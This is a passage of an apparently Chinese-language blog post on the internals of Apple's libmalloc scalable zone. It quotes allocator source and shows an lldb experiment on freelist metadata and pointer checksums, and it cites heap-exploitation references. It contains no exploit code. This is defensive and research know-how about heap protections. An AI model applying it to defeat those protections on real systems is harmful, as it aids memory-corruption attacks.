of configured processors.    // Uniprocessor case gets just one tiny and one small magazine (whose index is zero). This gives    // the same behavior as the original scalable malloc. MP gets per-CPU magazines    // that scale (way) better.    unsigned int max_mags = mag_max_magazines();    uint32_t num_magazines = (max_mags &gt; 1) ? MIN(max_mags, TINY_MAX_MAGAZINES) : 1;    rack_init(&amp;szone-&gt;tiny_rack, RACK_TYPE_TINY, num_magazines, debug_flags);    rack_init(&amp;szone-&gt;small_rack, RACK_TYPE_SMALL, num_magazines, debug_flags);#if CONFIG_LARGE_CACHE    // madvise(..., MADV_REUSABLE) death-row arrivals above this threshold [~0.1%]    szone-&gt;large_entry_cache_reserve_limit = (size_t)(memsize &gt;&gt; 10);    /* &lt;rdar://problem/6610904&gt; Reset protection when returning a previous large allocation? */    int32_t libSystemVersion = NSVersionOfLinkTimeLibrary(&quot;System&quot;);    if ((-1 != libSystemVersion) &amp;&amp; ((libSystemVersion &gt;&gt; 16) &lt; 112) /* CFSystemVersionSnowLeopard */) {        szone-&gt;large_legacy_reset_mprotect = TRUE;    } else {        szone-&gt;large_legacy_reset_mprotect = FALSE;    }#endif    // Initialize the security token.    szone-&gt;cookie = (uintptr_t)malloc_entropy[0];    szone-&gt;basic_zone.version = 10;    szone-&gt;basic_zone.size = (void *)szone_size;    szone-&gt;basic_zone.malloc = (void *)szone_malloc;    szone-&gt;basic_zone.calloc = (void *)szone_calloc;    szone-&gt;basic_zone.valloc = (void *)szone_valloc;    szone-&gt;basic_zone.free = (void *)szone_free;    szone-&gt;basic_zone.realloc = (void *)szone_realloc;    szone-&gt;basic_zone.destroy = (void *)szone_destroy;    szone-&gt;basic_zone.batch_malloc = (void *)szone_batch_malloc;    szone-&gt;basic_zone.batch_free = (void *)szone_batch_free;    szone-&gt;basic_zone.introspect = (struct malloc_introspection_t *)&amp;szone_introspect;    szone-&gt;basic_zone.memalign = (void *)szone_memalign;    szone-&gt;basic_zone.free_definite_size = (void *)szone_free_definite_size;    szone-&gt;basic_zone.pressure_relief = (void *)szone_pressure_relief;    szone-&gt;basic_zone.claimed_address = (void *)szone_claimed_address;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved1 = 0;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved2 = 0;    /* Prevent overwriting the function pointers in basic_zone. */    mprotect(szone, sizeof(szone-&gt;basic_zone), PROT_READ);    szone-&gt;debug_flags = debug_flags;    _malloc_lock_init(&amp;szone-&gt;large_szone_lock);    szone-&gt;cpu_id_key = -1UL; // Unused.    CHECK(szone, __PRETTY_FUNCTION__);    return szone;}</code></pre><p>这个函数分配并且初始化了szone，设置了<code>szone_malloc</code>、<code>szone_free</code>等函数</p><p>所以后面在调用<code>malloc</code>和<code>free</code>的时候实际上调用的是<code>szone_malloc</code>、<code>szone_free</code>。<code>szone_malloc</code>的实现涉及到苹果关于堆设计中最重要的部分，这里先不展开讲解。可以看出苹果设计的这种结构很方便扩展，事实上的确如此，不仅是scalable zone，还可以注册WebKit Malloc、GFXMallocZone、QuartzCore。由对应zone的<code>malloc_zone_*</code>进行实际的内存分配工作。</p><p>下面是程序第一次调用malloc的栈帧，可以看出与我们分析的调用顺序一致</p><pre><code class="c"> *  frame #0: 0x00007fff60bd72af libsystem_malloc.dylib`create_scalable_szone    frame #1: 0x00007fff60bd6e71 libsystem_malloc.dylib`_malloc_initialize + 1482    frame #2: 0x00007fff60c0facb libsystem_platform.dylib`_os_once_callout + 18    frame #3: 0x00007fff60bd68a5 libsystem_malloc.dylib`default_zone_malloc + 77    frame #4: 0x00007fff60bd6807 libsystem_malloc.dylib`malloc_zone_malloc + 103    frame #5: 0x00007fff60bd6783 libsystem_malloc.dylib`malloc + 24    frame #6: 0x00007fff60a9831d libsystem_c.dylib`arc4_init + 109    frame #7: 0x00007fff60a98479 libsystem_c.dylib`arc4random_buf + 37    frame #8: 0x00007fff5f94644e libobjc.A.dylib`_read_images + 396    frame #9: 0x00007fff5f945473 libobjc.A.dylib`map_images_nolock + 1197    frame #10: 0x00007fff5f959279 libobjc.A.dylib`map_images + 68    ....</code></pre><h4 id="scalable-zone"><a href="#scalable-zone" class="headerlink" title="scalable zone"></a>scalable zone</h4><p>szone包含两个racks，分别是tiny和small rack</p><table><thead><tr><th>rack</th><th>32位机器</th><th>64位机器</th></tr></thead><tbody><tr><td>tiny</td><td>&lt;= 496B</td><td>&lt;= 1008B</td></tr><tr><td>small</td><td>&lt;= 128KB</td><td>&lt;=128KB</td></tr></tbody></table><p>大于127KB的就由large allocator分配，直接采用分配页大小的方式。这里不详细讨论。</p><ul><li>有几个处理器，rack就有几个magazine</li><li>每个magazine有多个regions，tiny(1MB)、small(8MB)</li><li>每个region被分为quantum，tiny(16B，64520 Q/region)、small(512B，16319 Q/region)</li></ul><p>具体可以从后面结构体中看出来其包含关系。</p><h5 id="malloc-gt-szone-malloc-gt-szone-malloc-should-clear"><a href="#malloc-gt-szone-malloc-gt-szone-malloc-should-clear" class="headerlink" title="malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear"></a>malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear</h5><pre><code class="c">MALLOC_NOINLINE void *szone_malloc_should_clear(szone_t *szone, size_t size, boolean_t cleared_requested){    void *ptr;    msize_t msize;    if (size &lt;= SMALL_THRESHOLD) {        // tiny size: &lt;=1008 bytes (64-bit), &lt;=496 bytes (32-bit)        // think tiny        msize = TINY_MSIZE_FOR_BYTES(size + TINY_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = tiny_malloc_should_clear(&amp;szone-&gt;tiny_rack, msize, cleared_requested);    } else if (size &lt;= szone-&gt;large_threshold) {        // small size: &lt;=15k (iOS), &lt;=64k (large iOS), &lt;=128k (macOS)        // think small        msize = SMALL_MSIZE_FOR_BYTES(size + SMALL_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = small_malloc_should_clear(&amp;szone-&gt;small_rack, msize, cleared_requested);    } else {        // large: all other allocations        size_t num_kernel_pages = round_page_quanta(size) &gt;&gt; vm_page_quanta_shift;        if (num_kernel_pages == 0) { /* Overflowed */            ptr = 0;        } else {            ptr = large_malloc(szone, num_kernel_pages, 0, cleared_requested);        }    }    return ptr;}</code></pre><p>上面可以清楚看出会根据其申请内存大小从tiny、small、large三种方式分配。这里以tiny为例</p><h5 id="tiny-malloc-should-clear"><a href="#tiny-malloc-should-clear" class="headerlink" title="tiny_malloc_should_clear"></a>tiny_malloc_should_clear</h5><pre><code class="c">void *tiny_malloc_should_clear(rack_t *rack, msize_t msize, boolean_t cleared_requested){    void *ptr;    mag_index_t mag_index = tiny_mag_get_thread_index() % rack-&gt;num_magazines;    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_malloc, (uintptr_t)rack, TINY_BYTES_FOR_MSIZE(msize), (uintptr_t)tiny_mag_ptr, cleared_requested);#if DEBUG_MALLOC    if (DEPOT_MAGAZINE_INDEX == mag_index) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;malloc called for magazine index -1\n&quot;);        return (NULL);    }    if (!msize) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;invariant broken (!msize) in allocation (region)\n&quot;);        return (NULL);    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    ptr = tiny_mag_ptr-&gt;mag_last_free;    if (tiny_mag_ptr-&gt;mag_last_free_msize == msize) {        // we have a winner        tiny_mag_ptr-&gt;mag_last_free = NULL;        tiny_mag_ptr-&gt;mag_last_free_msize = 0;        tiny_mag_ptr-&gt;mag_last_free_rgn = NULL;        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        CHECK(szone, __PRETTY_FUNCTION__);        if (cleared_requested) {            memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));        }#if DEBUG_MALLOC        if (LOG(szone, ptr)) {            malloc_report(ASL_LEVEL_INFO, &quot;in tiny_malloc_should_clear(), tiny cache ptr=%p, msize=%d\n&quot;, ptr, msize);        }#endif        return ptr;    }#endif /* CONFIG_TINY_CACHE */    while (1) {        ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);        if (ptr) {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            if (cleared_requested) {                memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));            }            return ptr;        }        if (tiny_get_region_from_depot(rack, tiny_mag_ptr, mag_index, msize)) {            ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);            if (ptr) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                if (cleared_requested) {                    memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));                }                return ptr;            }        }        // The magazine is exhausted. A new region (heap) must be allocated to satisfy this call to malloc().        // The allocation, an mmap() system call, will be performed outside the magazine spin locks by the first        // thread that suffers the exhaustion. That thread sets &quot;alloc_underway&quot; and enters a critical section.        // Threads arriving here later are excluded from the critical section, yield the CPU, and then retry the        // allocation. After some time the magazine is resupplied, the original thread leaves with its allocation,        // and retry-ing threads succeed in the code just above.        if (!tiny_mag_ptr-&gt;alloc_underway) {            void *fresh_region;            // time to create a new region (do this outside the magazine lock)            tiny_mag_ptr-&gt;alloc_underway = TRUE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            fresh_region = mvm_allocate_pages_securely(TINY_REGION_SIZE, TINY_BLOCKS_ALIGN, VM_MEMORY_MALLOC_TINY, rack-&gt;debug_flags);            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);            // DTrace USDT Probe            MAGMALLOC_ALLOCREGION(TINY_SZONE_FROM_RACK(rack), (int)mag_index, fresh_region, TINY_REGION_SIZE);            if (!fresh_region) { // out of memory!                tiny_mag_ptr-&gt;alloc_underway = FALSE;                OSMemoryBarrier();                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                return NULL;            }            ptr = tiny_malloc_from_region_no_lock(rack, tiny_mag_ptr, mag_index, msize, fresh_region);            // we don&#39;t clear because this freshly allocated space is pristine            tiny_mag_ptr-&gt;alloc_underway = FALSE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            return ptr;        } else {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            yield();            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);        }    }    /* NOTREACHED */}</code></pre><p>这里的<code>if (tiny_mag_ptr-&gt;mag_last_free_msize == msize)</code>是判断申请大小是否和缓存的大小相同，如果相同，则直接把该内存返回给程序。反之则从<code>ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);</code>free list中去获取刚好大于该大小的free list。这里的free list是按quantum的倍数递增的一个链表。若还是不能满足则去freelist中由合并得到的较大block中去分配。还不能满足则去region剩余部分申请。最后还不满足则申请新的一个region。申请失败则返回NULL。</p><h5 id="free-gt-malloc-zone-free-gt-szone-free"><a href="#free-gt-malloc-zone-free-gt-szone-free" class="headerlink" title="free-&gt;malloc_zone_free-&gt;szone_free"></a>free-&gt;malloc_zone_free-&gt;szone_free</h5><pre><code class="c">voidszone_free(szone_t *szone, void *ptr){    region_t tiny_region;    region_t small_region;#if DEBUG_MALLOC    if (LOG(szone, ptr)) {        malloc_report(ASL_LEVEL_INFO, &quot;in szone_free with %p\n&quot;, ptr);    }#endif    if (!ptr) {        return;    }    /*     * Try to free to a tiny region.     */    if ((uintptr_t)ptr &amp; (TINY_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed\n&quot;, ptr);        return;    }    if ((tiny_region = tiny_region_for_ptr_no_lock(&amp;szone-&gt;tiny_rack, ptr)) != NULL) {        if (TINY_INDEX_FOR_PTR(ptr) &gt;= NUM_TINY_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed\n&quot;, ptr);            return;        }        free_tiny(&amp;szone-&gt;tiny_rack, ptr, tiny_region, 0);        return;    }    /*     * Try to free to a small region.     */    if ((uintptr_t)ptr &amp; (SMALL_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed (2)\n&quot;, ptr);        return;    }    if ((small_region = small_region_for_ptr_no_lock(&amp;szone-&gt;small_rack, ptr)) != NULL) {        if (SMALL_META_INDEX_FOR_PTR(ptr) &gt;= NUM_SMALL_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed (2)\n&quot;, ptr);            return;        }        free_small(&amp;szone-&gt;small_rack, ptr, small_region, 0);        return;    }    /* check that it&#39;s a legal large allocation */    if ((uintptr_t)ptr &amp; (vm_page_quanta_size - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;non-page-aligned, non-allocated pointer %p being freed\n&quot;, ptr);        return;    }    free_large(szone, ptr);}</code></pre><p>同样，free的时候会先判断该内存是否属于tiny，small，large。则选取对应的free函数。这里以tiny为例</p><pre><code class="c">voidfree_tiny(rack_t *rack, void *ptr, region_t tiny_region, size_t known_size){    msize_t msize;    boolean_t is_free;    mag_index_t mag_index = MAGAZINE_INDEX_FOR_TINY_REGION(tiny_region);    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_free, (uintptr_t)rack, (uintptr_t)ptr, (uintptr_t)tiny_mag_ptr, known_size);    // ptr is known to be in tiny_region    if (known_size) {        msize = TINY_MSIZE_FOR_BYTES(known_size + TINY_QUANTUM - 1);    } else {        msize = get_tiny_meta_header(ptr, &amp;is_free);        if (is_free) {            free_tiny_botch(rack, ptr);            return;        }    }#if DEBUG_MALLOC    if (!msize) {        malloc_report(ASL_LEVEL_ERR, &quot;*** free_tiny() block in use is too large: %p\n&quot;, ptr);        return;    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    // Depot does not participate in CONFIG_TINY_CACHE since it can&#39;t be directly malloc()&#39;d    if (DEPOT_MAGAZINE_INDEX != mag_index) {        if (msize &lt; TINY_QUANTUM) {                      // to see if the bits fit in the last 4 bits            void *ptr2 = tiny_mag_ptr-&gt;mag_last_free; // Might be NULL            msize_t msize2 = tiny_mag_ptr-&gt;mag_last_free_msize;            region_t rgn2 = tiny_mag_ptr-&gt;mag_last_free_rgn;            /* check that we don&#39;t already have this pointer in the cache */            if (ptr == ptr2) {                free_tiny_botch(rack, ptr);                return;            }            if ((rack-&gt;debug_flags &amp; MALLOC_DO_SCRIBBLE) &amp;&amp; msize) {                memset(ptr, SCRABBLE_BYTE, TINY_BYTES_FOR_MSIZE(msize));            }            tiny_mag_ptr-&gt;mag_last_free = ptr;            tiny_mag_ptr-&gt;mag_last_free_msize = msize;            tiny_mag_ptr-&gt;mag_last_free_rgn = tiny_region;            if (!ptr2) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                return;            }            msize = msize2;            ptr = ptr2;            tiny_region = rgn2;        }    }#endif /* CONFIG_TINY_CACHE */    // Now in the time it took to acquire the lock, the region may have migrated    // from one magazine to another. I.e. trailer-&gt;mag_index is volatile.    // In which case the magazine lock we obtained (namely magazines[mag_index].mag_lock)    // is stale. If so, keep on tryin&#39; ...    region_trailer_t *trailer = REGION_TRAILER_FOR_TINY_REGION(tiny_region);    mag_index_t refreshed_index;    while (mag_index != (refreshed_index = trailer-&gt;mag_index)) { // Note assignment        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        mag_index = refreshed_index;        tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);        SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);    }    if (tiny_free_no_lock(rack, tiny_mag_ptr, mag_index, tiny_region, ptr, msize)) {        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);    }    CHECK(szone, __PRETTY_FUNCTION__);}</code></pre><p>free的时候先将该内存缓存到<code>mag_last_free</code>，若之前<code>mag_last_free</code>为NULL，那么该内存暂时不会被free，仅仅是缓存到<code>mag_last_free</code>。反之，则会将<code>mag_last_free</code>之前的内存free。在free的时候会尝试向前向后合并。合并完成后设置其前后chunk指针等metadata后将其放入对应的free list大小之中。这里需要有注意以下几点</p><ul><li>最近free的内存会被缓存，不会立即合并</li><li>在被free的块metadata是被保护的<ul><li>前后指针按16字节大小对齐</li><li>指针前4位为checksum</li></ul></li></ul><p>关于free块checksum计算如下：</p><pre><code class="c">static MALLOC_INLINE uintptr_tfree_list_checksum_ptr(rack_t *rack, void *ptr){    uintptr_t p = (uintptr_t)ptr;    return (p &gt;&gt; NYBBLE) | ((free_list_gen_checksum(p ^ rack-&gt;cookie) &amp; (uintptr_t)0xF) &lt;&lt; ANTI_NYBBLE); // compiles to rotate instruction}</code></pre><p>指针p与cookie异或然后计算checksum后左移到最高字节或上指针p右移4位得到checksumed后的指针。</p><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>代码如下</p><pre><code class="c">#include &lt;stdio.h&gt;int main(int argc, char *argv[]) {    void *p1,*p2,*p3,*p4;    p1 = malloc(24);    p2 = malloc(24);    p3 = malloc(24);    p4 = malloc(24);    memset(p1,0xaa,24);    memset(p2,0xbb,24);    memset(p3,0xcc,24);    free(p1);    free(p3);    free(p2);    free(p4);}</code></pre><p>free(p1)，直接将p1缓存，所以内存值不变</p><pre><code class="c">(lldb) x/24gx p10x1002001f0: 0xaaaaaaaaaaaaaaaa 0xaaaaaaaaaaaaaaaa0x100200200: 0xaaaaaaaaaaaaaaaa 0x00007fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p3)，p3放入缓存，p1放入大小为32字节的freelist，p1previous指针8字节设为NULL，next指针指向设为下一个free block，紧接着后面为该block大小，2*quantum=32字节</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p2)，p2放入缓存，p3放入大小为32字节的freelist，p3previous指针8字节设为NULL，next指针指向设为下一个p1</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x3000000010020023 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x200000001002001f0x100200240: 0xcccccccccccc0002 0x00020000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>free(p4)，p2向前向后合并，合并p1，p3。指向p1，大小为6*quantum=96字节。previous指针8字节设为NULL，next指针指向设为下一个大小为3Q的block</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x50000000100200480x100200200: 0xaaaaaaaaaaaa0006 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x10000000100201080x100200240: 0xcccccccccccc0002 0x00060000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>上面可以看出previous和next指针前4位都包含checksum。与上面描述的一致。</p><h4 id="libmalloc中一些结构体"><a href="#libmalloc中一些结构体" class="headerlink" title="libmalloc中一些结构体"></a>libmalloc中一些结构体</h4><h5 id="szone-s-magazine-zone-h"><a href="#szone-s-magazine-zone-h" class="headerlink" title="szone_s // magazine_zone.h"></a>szone_s // magazine_zone.h</h5><pre><code class="c">typedef struct szone_s {      // vm_allocate()&#39;d, so page-aligned to begin with.    malloc_zone_t basic_zone; // first page will be given read-only protection    uint8_t pad[PAGE_MAX_SIZE - sizeof(malloc_zone_t)];    unsigned long cpu_id_key; // unused    // remainder of structure is R/W (contains no function pointers)    unsigned debug_flags;    void *log_address;    /* Allocation racks per allocator type. */    struct rack_s tiny_rack;    struct rack_s small_rack;    /* large objects: all the rest */    _malloc_lock_s large_szone_lock MALLOC_CACHE_ALIGN; // One customer at a time for large    unsigned num_large_objects_in_use;    unsigned num_large_entries;    large_entry_t *large_entries; // hashed by location; null entries don&#39;t count    size_t num_bytes_in_large_objects;#if CONFIG_LARGE_CACHE    int large_entry_cache_oldest;    int large_entry_cache_newest;    large_entry_t large_entry_cache[LARGE_ENTRY_CACHE_SIZE]; // &quot;death row&quot; for large malloc/free    boolean_t large_legacy_reset_mprotect;    size_t large_entry_cache_reserve_bytes;    size_t large_entry_cache_reserve_limit;    size_t large_entry_cache_bytes; // total size of death row, bytes#endif    /* flag and limits pertaining to altered malloc behavior for systems with     * large amounts of physical memory */    unsigned is_largemem;    unsigned large_threshold;    unsigned vm_copy_threshold;    /* security cookie */    uintptr_t cookie;    /* The purgeable zone constructed by create_purgeable_zone() would like to hand off tiny and small     * allocations to the default scalable zone. Record the latter as the &quot;helper&quot; zone here. */    struct szone_s *helper_zone;    boolean_t flotsam_enabled;} szone_t;</code></pre><h5 id="malloc-zone-t-malloc-h"><a href="#malloc-zone-t-malloc-h" class="headerlink" title="malloc_zone_t // malloc.h"></a>malloc_zone_t // malloc.h</h5><pre><code class="c">typedef struct _malloc_zone_t {    /* Only zone implementors should depend on the layout of this structure;    Regular callers should use the access functions below */    void    *reserved1;    /* RESERVED FOR CFAllocator DO NOT USE */    void    *reserved2;    /* RESERVED FOR CFAllocator DO NOT USE */    size_t     (* MALLOC_ZONE_FN_PTR(size))(struct _malloc_zone_t *zone, const void *ptr); /* returns the size of a block or 0 if not in this zone; must be fast, especially for negative answers */    void     *(* MALLOC_ZONE_FN_PTR(malloc))(struct _malloc_zone_t *zone, size_t size);    void     *(* MALLOC_ZONE_FN_PTR(calloc))(struct _malloc_zone_t *zone, size_t num_items, size_t size); /* same as malloc, but block returned is set to zero */    void     *(* MALLOC_ZONE_FN_PTR(valloc))(struct _malloc_zone_t *zone, size_t size); /* same as malloc, but block returned is set to zero and is guaranteed to be page aligned */    void     (* MALLOC_ZONE_FN_PTR(free))(struct _malloc_zone_t *zone, void *ptr);    void     *(* MALLOC_ZONE_FN_PTR(realloc))(struct _malloc_zone_t *zone, void *ptr, size_t size);    void     (* MALLOC_ZONE_FN_PTR(destroy))(struct _malloc_zone_t *zone); /* zone is destroyed and all memory reclaimed */g    const char    *zone_name;    /* Optional batch callbacks; these may be NULL */    unsigned    (* MALLOC_ZONE_FN_PTR(batch_malloc))(struct _malloc_zone_t *zone, size_t size, void **results, unsigned num_requested); /* given a size, returns pointers capable of holding that size; returns the number of pointers allocated (maybe 0 or less than num_requested) */    void    (* MALLOC_ZONE_FN_PTR(batch_free))(struct _malloc_zone_t *zone, void **to_be_freed, unsigned num_to_be_freed); /* frees all the pointers in to_be_freed; note that to_be_freed may be overwritten during the process */    struct malloc_introspection_t    * MALLOC_INTROSPECT_TBL_PTR(introspect);    unsigned    version;    /* aligned memory allocation. The callback may be NULL. Present in version &gt;= 5. */    void *(* MALLOC_ZONE_FN_PTR(memalign))(struct _malloc_zone_t *zone, size_t alignment, size_t size);    /* free a pointer known to be in zone and known to have the given size. The callback may be NULL. Present in version &gt;= 6.*/    void (* MALLOC_ZONE_FN_PTR(free_definite_size))(struct _malloc_zone_t *zone, void *ptr, size_t size);    /* Empty out caches in the face of memory pressure. The callback may be NULL. Present in version &gt;= 8. */    size_t     (* MALLOC_ZONE_FN_PTR(pressure_relief))(struct _malloc_zone_t *zone, size_t goal);    /*     * Checks whether an address might belong to the zone. May be NULL. Present in version &gt;= 10.     * False positives are allowed (e.g. the pointer was freed, or it&#39;s in zone space that has     * not yet been allocated. False negatives are not allowed.     */    boolean_t (* MALLOC_ZONE_FN_PTR(claimed_address))(struct _malloc_zone_t *zone, void *ptr);} malloc_zone_t;</code></pre><h5 id="rack-t-magazine-rack-h"><a href="#rack-t-magazine-rack-h" class="headerlink" title="rack_t // magazine_rack.h"></a>rack_t // magazine_rack.h</h5><pre><code class="c">typedef struct rack_s {    /* Regions for tiny objects */    _malloc_lock_s region_lock MALLOC_CACHE_ALIGN;    rack_type_t type;    size_t num_regions;    size_t num_regions_dealloc;    region_hash_generation_t *region_generation;    region_hash_generation_t rg[2];    region_t initial_regions[INITIAL_NUM_REGIONS];    int num_magazines;    unsigned num_magazines_mask;    int num_magazines_mask_shift;    uint32_t debug_flags;    // array of per-processor magazines    magazine_t *magazines;    uintptr_t cookie;    uintptr_t last_madvise;} rack_t;</code></pre><h5 id="magazine-t-magazine-zone-h"><a href="#magazine-t-magazine-zone-h" class="headerlink" title="magazine_t // magazine_zone.h"></a>magazine_t // magazine_zone.h</h5><pre><code class="c">typedef struct magazine_s { // vm_allocate()&#39;d, so the array of magazines is page-aligned to begin with.    // Take magazine_lock first,  Depot lock when needed for recirc, then szone-&gt;{tiny,small}_regions_lock when needed for alloc    _malloc_lock_s magazine_lock MALLOC_CACHE_ALIGN;    // Protection for the crtical section that does allocate_pages outside the magazine_lock    volatile boolean_t alloc_underway;    // One element deep &quot;death row&quot;, optimizes malloc/free/malloc for identical size.    void *mag_last_free;    msize_t mag_last_free_msize;    // msize for mag_last_free#if MALLOC_TARGET_64BIT    uint32_t _pad;#endif    region_t mag_last_free_rgn; // holds the region for mag_last_free    free_list_t mag_free_list[MAGAZINE_FREELIST_SLOTS];    uint32_t mag_bitmap[MAGAZINE_FREELIST_BITMAP_WORDS];    // the first and last free region in the last block are treated as big blocks in use that are not accounted for    size_t mag_bytes_free_at_end;    size_t mag_bytes_free_at_start;    region_t mag_last_region; // Valid iff mag_bytes_free_at_end || mag_bytes_free_at_start &gt; 0    // bean counting ...    size_t mag_num_bytes_in_objects;    size_t num_bytes_in_magazine;    unsigned mag_num_objects;    // recirculation list -- invariant: all regions owned by this magazine that meet the emptiness criteria    // are located nearer to the head of the list than any region that doesn&#39;t satisfy that criteria.    // Doubly linked list for efficient extraction.    unsigned recirculation_entries;    region_trailer_t *firstNode;    region_trailer_t *lastNode;#if MALLOC_TARGET_64BIT    uintptr_t pad[320 - 14 - MAGAZINE_FREELIST_SLOTS -            (MAGAZINE_FREELIST_BITMAP_WORDS + 1) / 2];#else    uintptr_t pad[320 - 16 - MAGAZINE_FREELIST_SLOTS -            MAGAZINE_FREELIST_BITMAP_WORDS];#endif} magazine_t;</code></pre><h5 id="tiny-region-t-magazine-zone-h"><a href="#tiny-region-t-magazine-zone-h" class="headerlink" title="tiny_region_t //magazine_zone.h"></a>tiny_region_t //magazine_zone.h</h5><pre><code class="c">/* * Layout of a tiny region */typedef uint32_t tiny_block_t[4]; // assert(TINY_QUANTUM == sizeof(tiny_block_t))typedef struct tiny_header_inuse_pair {    uint32_t header;    uint32_t inuse;} tiny_header_inuse_pair_t;typedef struct region_trailer {    struct region_trailer *prev;    struct region_trailer *next;    boolean_t recirc_suitable;    volatile int pinned_to_depot;    unsigned bytes_used;    mag_index_t mag_index;} region_trailer_t;#define NUM_TINY_BLOCKS 64520typedef struct tiny_region {    tiny_block_t blocks[NUM_TINY_BLOCKS];    region_trailer_t trailer;    // The interleaved bit arrays comprising the header and inuse bitfields.    // The unused bits of each component in the last pair will be initialized to sentinel values.    tiny_header_inuse_pair_t pairs[CEIL_NUM_TINY_BLOCKS_WORDS];    uint8_t pad[TINY_REGION_SIZE - (NUM_TINY_BLOCKS * sizeof(tiny_block_t)) - TINY_METADATA_SIZE];} * tiny_region_t;</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><p><a href="http://phrack.org/issues/63/5.html" target="_blank" rel="external">http://phrack.org/issues/63/5.html</a></p></li><li><p><a href="https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf" target="_blank" rel="external">https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf</a></p></li><li><p><a href="https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf" target="_blank" rel="external">https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf</a></p></li><li><p><a href="https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html" target="_blank" rel="external">https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html</a></p></li><li><p>&lt;&lt;<a href="https://repo.zenk-security.com/Magazine%20E-book/The%20Mac%20Hacker&#39;s%20Handbook.pdf" target="_blank" rel="external">the Mac Hacker’s Handbook</a>&gt;&gt; 第8章Exploiting Heap Overflows</p></li><li><p><a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">https://opensource.apple.com/source/libmalloc/</a> 源代码</p></li><li><p><a href="http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf" target="_blank" rel="external">http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
